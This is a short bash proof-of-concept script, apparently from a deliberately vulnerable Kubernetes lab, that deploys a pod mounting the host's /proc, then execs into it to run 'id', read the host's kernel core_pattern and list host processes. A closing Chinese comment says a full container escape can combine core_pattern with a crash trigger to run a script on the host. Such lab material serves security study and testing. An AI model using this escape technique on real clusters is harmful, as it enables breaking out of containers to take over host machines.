#!/usr/bin/env bash
set -Eeuo pipefail

POC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
MANIFEST="$POC_DIR/scene.yaml"
NAMESPACE="${NAMESPACE:-metarget}"

if [[ "${1:-}" == "--cleanup" ]]; then
  kubectl delete -f "$MANIFEST" --ignore-not-found
  echo "[+] Cleaned resources from $MANIFEST"
  exit 0
fi

command -v kubectl >/dev/null 2>&1 || { echo "[-] Missing dependency: kubectl"; exit 1; }

kubectl apply -f "$MANIFEST"
kubectl wait --for=condition=Ready "pod/mount-host-procfs" -n "$NAMESPACE" --timeout=120s || true
kubectl exec -n "$NAMESPACE" "mount-host-procfs" -- sh -lc 'id; cat /host-proc/sys/kernel/core_pattern || true; ls /host-proc | head'

echo "[*] 完整逃逸可结合 core_pattern + 崩溃触发执行宿主机路径脚本。"
